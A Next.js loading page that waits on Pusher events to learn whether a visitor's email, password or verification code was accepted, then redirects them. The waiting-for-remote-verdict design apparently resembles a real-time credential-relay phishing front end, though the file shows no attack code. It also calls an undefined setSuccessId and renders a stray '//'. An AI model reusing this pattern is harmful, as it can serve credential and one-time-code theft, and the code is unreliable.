// import React from 'react'

// function page() {
//   return (
//     <div className=" mt-[300px]">
//         <div class="flex flex-col items-center ">
	
// 	<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
// 		<circle class="opacity-25" stroke="currentColor" stroke-width="4" cx="12" cy="12" r="10"></circle>
// 		<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
// 	</svg>
// </div>


//     </div>
//   )
// }

// export default page




"use client";
import { useEffect, useState } from 'react';
import { useRouter } from "next/navigation";
import Pusher from "pusher-js";
import Cookies from 'js-cookie';
function Loading() {
  const router = useRouter()
  const[wrongPasswordId, setWrongPasswordId] = useState('');
  const[wrongMailId, setWrongMailId] = useState('');

  const[verifyId, setVerifyId] = useState('');
  console.log(wrongPasswordId)
  const id = Cookies.get("id");
  const pusher = new Pusher("e4766909b306ad7ddd58", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });
  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind('pass-wrong', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      console.log(data.id)
      setWrongPasswordId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('pass-wrong');
      channel.unsubscribe(id);
    };
  }, [id]);
  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind('email-wrong', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      console.log(data.id)
      setWrongMailId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('email-wrong');
      channel.unsubscribe(id);
    };
  }, [id]);
  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind('login-successfull', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      console.log(data.id)
      setSuccessId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('login-successfull');
      channel.unsubscribe(id);
    };
  }, [id]);
  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind('code-verify', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      Cookies.set("code", data.code);
      setVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('code-verify');
      channel.unsubscribe(id);
    };
  }, [id]);
  if (wrongMailId) {
    // Perform the revalidation or data fetching logic here
  return router.push(`/signin`);
  }
  if (wrongPasswordId) {
    // Perform the revalidation or data fetching logic here
  return router.push(`/wrongPassword`);
  }
;
  
  if (verifyId) {
    // Perform the revalidation or data fetching logic here
  return router.push(`/verifyCode`);
  }
  return (
    
      <div className=" mt-[300px]">
        <div class="flex flex-col items-center ">
	
 	<svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
		<circle class="opacity-25" stroke="currentColor" stroke-width="4" cx="12" cy="12" r="10"></circle>
// 		<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
 	</svg>
 </div>


   </div>
  
  );
}
 export default Loading;